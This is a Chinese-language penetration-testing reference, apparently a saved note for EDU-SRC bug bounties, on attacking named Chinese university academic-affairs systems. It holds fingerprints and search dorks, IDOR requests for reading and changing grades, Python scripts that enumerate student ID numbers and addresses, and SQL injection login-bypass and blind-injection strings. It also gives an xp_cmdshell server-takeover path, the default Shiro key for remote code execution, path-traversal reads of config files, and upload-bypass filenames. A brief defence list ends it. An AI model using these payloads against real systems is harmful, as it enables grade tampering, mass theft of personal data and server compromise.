---
name: EDU-SRC 教务系统专有漏洞
description: 教务系统特有漏洞类型、挖掘技巧、PoC
type: reference
originSessionId: ee20960f-1d7b-4892-a567-02767c979e0a
---
# EDU-SRC 教务系统专有漏洞

## 常见教务系统指纹

### 正方教务系统 (Zhengfang / ZFSoft)
- **识别特征**：
  - 页面标题常含"正方教务管理系统"、版权信息 `Copyright © ZFSoft`
  - URL 路径特征：`/jiaowu/`、`/jsxsd/`（新版）、`/zfsoft/`
  - JS 文件中含版本号，如 `ZFWebPrint.dll` 等 ActiveX 控件
  - 自定义 HTTP 头：`X-ZF-Auth`
  - 课表接口：`/jsxsd/xskb/xskb_list.do`
  - 成绩接口：`/jsxsd/kscj/cjcx_list`
  - 个人信息：`/jsxsd/grxx/xsxx`
- **搜索引擎语法**：`site:edu.cn inurl:jiaowu` / `site:edu.cn inurl:jsxsd`

### 强智教务系统 (Qiangzhi)
- **识别特征**：
  - 页面标题含"强智教务管理系统"、"强智科技"
  - URL 路径特征：`/ZNPK/`、`/jsxsd/`、`/xsxx.aspx`、`/Login.aspx`
  - 使用 ASP.NET 技术栈（.aspx 后缀）
  - 集成了 ZKTeco 指纹设备 SDK
  - 指纹数据表：`TP_Fingerprint`
  - 常见的子域名：`jw`、`jwxt`、`jiaowu`
- **搜索引擎语法**：`site:edu.cn "强智教务"` / `site:edu.cn inurl:ZNPK`

### 青果教务系统 (Qingguo)
- **识别特征**：
  - 页面标题含"青果教务管理系统"
  - URL 路径特征：`/Template/`、`/Manage/`、`/System/UpLoadFile/`
  - 基于 ASP.NET，IIS 部署
  - 指纹传输数据包起始字节 `\x5A\x6B`（自定义协议）
  - 常见接口：`/Template/TemplateFileDownLoad.aspx`、`/Manage/FileDownload.aspx`
- **搜索引擎语法**：`site:edu.cn "青果" "教务系统"` / `site:edu.cn inurl:TemplateFileDownLoad`

### 金智教务系统 (Wiscom / JinZhi)
- **识别特征**：
  - 页面标题含"金智教务管理系统"、"Wiscom"
  - URL 路径特征：`/Wiscom/`、`/FpAuth/AuthCheck`
  - RESTful API 风格，动态 Token 挑战机制
  - 指纹模块特征：挑战-应答（challenge-response）机制
- **搜索引擎语法**：`site:edu.cn "金智" "教务"` / `site:edu.cn inurl:Wiscom`

### 苏文教务系统 (Suwen)
- **识别特征**：页面标题含"苏文教务"
- URL 特征：`/swjw/`

---

## 成绩相关漏洞

### 1. 成绩越权查询 (IDOR)
**风险等级**：高危
**影响系统**：正方 / 强智 / 青果 等所有主流教务系统

**漏洞描述**：成绩查询接口仅校验登录状态，未校验当前用户是否为被查询学号的拥有者。

**典型接口与参数**：
```
正方: POST /jsxsd/kscj/cjcx_list       参数: xh (学号), xn (学年), xq (学期)
强智: POST /xsxx.aspx                   参数: xh (学号)
青果: GET  /Score/Query.aspx?studentId=  参数: studentId
金智: POST /api/score/query             参数: studentId
```

**Payload 示例**：
```http
# 正方教务系统 - 成绩遍历
POST /jsxsd/kscj/cjcx_list HTTP/1.1
Host: jwxt.example.edu.cn
Cookie: JSESSIONID=xxxxx

xnxqid=2025-2026-1&xh=2023101101

# 修改 xh 参数遍历其他学生成绩
xnxqid=2025-2026-1&xh=2023101102
```

**批量导出攻击**：
```http
POST /score/exportAll HTTP/1.1
Content-Type: application/json
Cookie: JSESSIONID=xxxxx

{"studentIds": ["2023101101", "2023101102", "2023101103", ...]}
```
若服务端未校验权限，可一次性导出全校成绩。

### 2. 成绩篡改 (越权修改 / 参数篡改)
**风险等级**：严重
**影响系统**：正方 / 强智

**漏洞描述**：成绩提交/修改接口未校验操作者身份与参数的绑定关系。

**典型接口**：
```
正方: POST /score/admin/update          参数: teacherId, studentId, courseId, score
强智: POST /pkgl/xxx.aspx               参数: xh, kcbh, cj (成绩)
通用: POST /edu/grade/saveOrUpdate      参数: id, grade, studentId
```

**Payload 示例**：
```http
# 拦截教师成绩录入请求，篡改 teacherId 参数
POST /score/admin/update HTTP/1.1
Host: jwxt.example.edu.cn
Cookie: JSESSIONID=xxxxx
Content-Type: application/x-www-form-urlencoded

teacherId=T2020001&studentId=2023101101&courseId=C101&score=95&term=2025-2026-1

# 修改 teacherId 为其他教师ID，可冒用身份
teacherId=T2020002&studentId=2023101101&courseId=C101&score=95&term=2025-2026-1
```

**漏洞成因**：
- 服务端从请求参数中读取 `teacherId` 而非从 Session/Token 获取
- 缺乏操作审计日志或二次验证机制
- 学生账号可直接访问 `/score/admin/update` 等管理接口（垂直越权）

### 3. 成绩审核绕过
**风险等级**：中危
**影响系统**：正方 / 强智

**漏洞描述**：多级审核流程存在逻辑缺陷，"草稿保存"接口可绕过审核直接修改只读数据。

**测试方法**：
1. 教师录入成绩后提交审核
2. 拦截 "Save Draft"（保存草稿）请求
3. 修改成绩参数后重新提交
4. 若系统允许在"已审核"状态下通过草稿接口修改，则存在该漏洞

---

## 课表/选课漏洞

### 1. 课表遍历 (Timetable Traversal)
**风险等级**：中危（结合社工构成物理威胁）
**影响系统**：正方 / 强智

**漏洞描述**：课表查询接口未校验学号归属，可遍历全校课表。

**Payload 示例**：
```http
# 正方教务系统 - 课表遍历
GET /jsxsd/xskb/xskb_list.do?xnxqid=2025-2026-1&xh=2023101101 HTTP/1.1
Host: jwxt.example.edu.cn
Cookie: JSESSIONID=xxxxx

# 遍历学号获取全校课表
GET /jsxsd/xskb/xskb_list.do?xnxqid=2025-2026-1&xh=2023101102 HTTP/1.1
```

**影响**：
- 获取目标学生的上课地点、时间
- 结合社工实现线下跟踪（经典物理-网络结合攻击）

### 2. 选课并发漏洞 (Race Condition / 抢课)
**风险等级**：中危~高危
**影响系统**：正方 / 青果 / 强智

**漏洞描述**：选课接口存在竞态条件，`SELECT quota -> IF quota>0 -> INSERT enrollment` 缺乏原子性加锁。

**Payload 示例**：
```python
# 抢课脚本核心逻辑（高并发）
import requests
import threading

url = "http://jwxt.example.edu.cn/course/elective/select"
data = {"courseId": "C101", "studentId": "2023101101"}

def enroll():
    while True:
        r = requests.post(url, data=data, cookies=COOKIES)
        if "success" in r.text:
            print("抢课成功")
            break

# 启动50个线程并发请求
for i in range(50):
    threading.Thread(target=enroll).start()
```

**测试方法**：
1. 选课开始前拦截选课请求
2. 使用 Burp Intruder 或 Python 脚本发送高并发请求
3. 若选课人数超出限制，则存在并发漏洞

### 3. 选课参数篡改 (价格/容量)
**风险等级**：高危
**影响系统**：正方 / 强智

**Payload 示例**：
```http
POST /course/elective/select HTTP/1.1
Host: jwxt.example.edu.cn
Cookie: JSESSIONID=xxxxx
Content-Type: application/json

{
  "courseId": "C101",
  "studentId": "2023101101",
  "courseFee": 0,          # 将费用改为0
  "maxCapacity": 999,      # 篡改容量上限
  "selectedCount": 0       # 篡改已选人数
}
```

**测试方法**：
- 拦截选课请求，修改 `courseFee`、`maxCapacity`、`selectedCount` 等参数
- 修改 `courseId` 参数尝试代他人选课
- 尝试直接访问选课 API 绕过前置条件（如先修课程）

### 4. 退课逻辑漏洞
**风险等级**：中危

**测试方法**：
- 拦截退课请求，修改 `enrollId` 或 `studentId` 参数
- 尝试替他人退课（恶意退课攻击）
- 尝试退已取消/已结课的课程

---

## 个人信息泄露

### 1. 学生信息批量遍历
**风险等级**：高危~严重
**影响系统**：所有系统

**典型接口**：
```
GET /student/for-student/student-info/get-student-info?studentId=XXX
GET /xsxx.aspx?xh=XXX
GET /jsxsd/grxx/xsxx?xh=XXX
GET /api/student/profile?studentId=XXX
```

**可泄露数据**：
- 姓名、学号、身份证号
- 手机号、家庭住址
- 学院、专业、班级
- 学生照片（用于人脸识别冒用）
- 缴费记录、奖学金信息

**批量遍历脚本**：
```python
import requests

base_url = "http://jwxt.example.edu.cn/api/student/profile"
cookies = {"JSESSIONID": "xxxxx"}

# 学号范围：2023100001 - 2023109999
for sid in range(2023100001, 2023109999):
    r = requests.get(f"{base_url}?studentId={sid}", cookies=cookies)
    if r.status_code == 200:
        print(f"[+] {sid}: {r.text}")
```

### 2. 身份证号/敏感信息泄露
**常见泄露点**：
- 重置密码页面回显部分身份证号（如 `"310***********001X"`）
- 个人信息编辑接口返回完整身份证号
- 照片文件命名规则：`{身份证号}.jpg`，可遍历下载
- 缴费接口返回付款人身份信息

### 3. 教师信息泄露
**典型接口**：
```
GET /api/teacher/profile?teacherId=XXX
GET /jsxsd/grxx/teacher?zgh=XXX  （职工号遍历）
```

**可泄露数据**：
- 职工号、姓名、身份证号
- 联系方式、工资信息
- 授课列表、教学评价

---

## 注入漏洞

### 1. 正方教务系统 SQL 注入
**历史注入点**：
| 参数 | 位置 | 注入类型 |
|------|------|---------|
| `xh` | 成绩查询、课表查询 | 布尔盲注/联合注入 |
| `xnxq` | 课表查询 | 时间盲注 |
| `zxjxjhh` | 课表查询 | 联合注入 |
| `sfzh` | 个人信息查询 | 报错注入 |

**Payload 示例**：
```http
GET /jsxsd/kscj/cjcx_list?xnxqid=2025-2026-1&xh=2023101101' UNION SELECT ... HTTP/1.1
```

### 2. 强智教务系统 SQL 注入
**严重程度**：严重（部分版本数据库权限为 sa/dbo）

**常见注入点**：
```
登录页:     Login.aspx?user=admin' OR '1'='1
课表查询:   ZNPK/KBFB.aspx?xnxq=...&xqh=...
学生信息:   xsxx.aspx?zxjh=...
选课接口:   jsxsd/xk/Public/SelectMajor
```

**Payload 示例**：
```http
# 登录绕过
POST /Login.aspx HTTP/1.1
Host: jwxt.example.edu.cn

user=admin' OR '1'='1&pass=admin' OR '1'='1

# 时间盲注
GET /xsxx.aspx?xh=2023101101';WAITFOR DELAY '0:0:5'-- HTTP/1.1
```

**数据库攻击路径**：
1. SQL 注入脱库获取管理员密码哈希
2. 高权限注入执行 `xp_cmdshell` 拿下服务器
3. 通过注入获取教务人员账号，进一步提权

### 3. 强智 Shiro RCE
**漏洞描述**：强智教务系统集成 Apache Shiro，使用硬编码默认 RememberMe 密钥。

**默认密钥**：
```
kPH+bIxk5D2deZiIxcaaaA==
```

**利用方式**：
1. 使用 ShiroAttack2 或 ysoserial 工具
2. 利用默认密钥构造恶意 `rememberMe` Cookie
3. 通过 Java 反序列化执行任意命令（CommonsCollections 等 gadget chain）

**修复建议**：升级 Shiro 至 1.10.0+ 并更换随机密钥

---

## 文件操作漏洞

### 1. 青果教务系统 任意文件下载
**风险等级**：高危

**典型漏洞路径**：
```
/Template/TemplateFileDownLoad.aspx?file=../../web.config
/Manage/FileDownload.aspx?filename=../../App_Data/xxx.mdb
/System/UpLoadFile/ShowFile.aspx?Path=../../../etc/passwd
```

**可下载文件**：
- `web.config` — 数据库连接字符串、加密密钥
- `Global.asax` — 应用配置和事件处理
- `.mdb` / `.bak` — 数据库备份文件
- `App_Code/*.cs` — 源代码

**Payload**：
```http
GET /Template/TemplateFileDownLoad.aspx?file=../../web.config HTTP/1.1
Host: jwxt.example.edu.cn
```

### 2. 文件上传绕过 (Getshell)
**风险等级**：严重

**测试位置**：
- 头像上传
- 附件上传（作业、材料提交）
- 照片上传

**绕过方式**：
1. 修改 `Content-Type`: `image/png` -> `application/x-php` / `text/asp`
2. 文件名截断：`shell.asp%00.jpg` / `shell.asp;.jpg`
3. 双扩展名绕过：`shell.asp.jpg` / `shell.asp_.jpg`
4. 图片马 + 文件包含配合利用

---

## PoC / Checklist

### 测试前准备
- [ ] 确定教务系统类型（正方/强智/青果/金智/其他）
- [ ] 获取合法测试账号（学生、教师两个角色）
- [ ] 配置 Burp Suite 代理捕获流量
- [ ] 准备 Python 批量请求脚本

### IDOR 测试 Checklist
- [ ] 成绩查询接口：遍历 `xh`/`studentId` 参数
- [ ] 个人信息接口：遍历 `xh`/`studentId`/`userId` 参数
- [ ] 课表查询接口：遍历 `xh`/`studentId` 参数
- [ ] 成绩修改接口：篡改 `teacherId`/`studentId` 参数
- [ ] 选课接口：修改 `courseFee`/`maxCapacity` 参数
- [ ] 退课接口：修改 `enrollId`/`courseId` 参数
- [ ] 缴费接口：遍历 `orderId`/`chargeId` 参数
- [ ] 文件下载接口：遍历 `fileId`/`attachmentId`/`filename` 参数

### 注入测试 Checklist
- [ ] 登录页：`user=admin' OR '1'='1`、`pass=" OR ""="`
- [ ] 学号参数：`xh=2023101101' AND 1=1--`、`xh=2023101101' WAITFOR DELAY '0:0:5'--`
- [ ] 学期参数：`xnxq=2025-2026-1' UNION SELECT ...`
- [ ] 课程编号：`courseId=C101' AND SLEEP(5)`
- [ ] 职工号参数：`zgh=T2020001' AND 1=2 UNION SELECT ...`

### 竞态条件测试 Checklist
- [ ] 选课接口：并发 50+ 请求测试超选
- [ ] 退课接口：并发请求测试重复退课
- [ ] 成绩提交：并发请求测试成绩覆盖
- [ ] 积分/金币系统：并发请求测试重复领取

### 信息泄露 Checklist
- [ ] 目录扫描：`/backup/`、`/upload/`、`/DatabaseBackup/`、`/WEB-INF/`
- [ ] 敏感文件：`web.config`、`web.xml`、`application.properties`、`.git/config`
- [ ] JS 源码提取 API 端点
- [ ] 列目录漏洞（IIS 目录浏览）

### 常用工具链
1. **目录扫描**：`dirsearch` — 扫描教务系统目录结构
2. **注入工具**：`sqlmap` — 配合 `--technique=B/E/U/T` 参数
3. **抓包工具**：`Burp Suite` — 拦截、重放、Intruder 遍历
4. **反序列化**：`ShiroAttack2` / `ysoserial` — Shiro RCE 利用
5. **批量脚本**：Python `requests` + `aiohttp` — 高并发测试

### 典型请求参数速查表

| 含义 | 常见参数名 |
|------|-----------|
| 学号 | `xh`, `studentId`, `stuNo`, `studentid`, `userid` |
| 职工号 | `zgh`, `teacherId`, `teacherid`, `userId` |
| 课程编号 | `courseId`, `kcbh`, `kcdm`, `course_code` |
| 学年学期 | `xnxq`, `xnxqid`, `semesterId`, `term`, `xq` |
| 班级编号 | `classId`, `bjbh`, `bjdm` |
| 订单号 | `orderId`, `chargeId`, `tradeNo` |
| 文件ID | `fileId`, `attachmentId`, `file`, `filename`, `Path` |

---

## 防御建议（知识储备）

1. **服务端身份绑定**：所有 API 必须从 Session/Token 中解析当前用户，不信任客户端传入的 `studentId`/`teacherId`
2. **RBAC 层级校验**：校验"用户A 是否在学期Z 对课程Y 具有操作权限"
3. **速率限制**：同一 IP/用户对敏感接口设置频率上限，防止批量爬取
4. **参数混淆**：使用 UUID/哈希替代自增数字 ID
5. **预编译 SQL**：禁用拼接 SQL，所有参数使用 PreparedStatement
6. **数据库权限收缩**：严禁使用 sa/dbo 等高权限账户连接应用
7. **Shiro 密钥随机化**：更换默认 RememberMe 密钥，升级至 1.10.0+
8. **文件上传白名单**：白名单校验扩展名和 MIME 类型
9. **选课加锁**：使用 Redis 分布式锁或数据库行级锁 `SELECT ... FOR UPDATE`
10. **操作审计日志**：所有成绩修改、选课退课操作记录 Session 信息
